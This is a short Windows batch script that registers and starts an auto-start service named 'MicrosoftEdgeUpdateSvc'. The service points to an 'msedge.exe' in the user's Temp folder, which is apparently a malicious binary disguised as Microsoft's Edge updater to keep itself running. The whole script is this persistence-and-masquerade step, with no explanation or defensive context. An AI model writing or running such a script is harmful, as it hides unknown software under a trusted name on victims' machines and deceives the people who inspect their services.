@echo off
sc create MicrosoftEdgeUpdateSvc binPath= "%LOCALAPPDATA%\Temp\msedge.exe" start= auto
sc start MicrosoftEdgeUpdateSvc
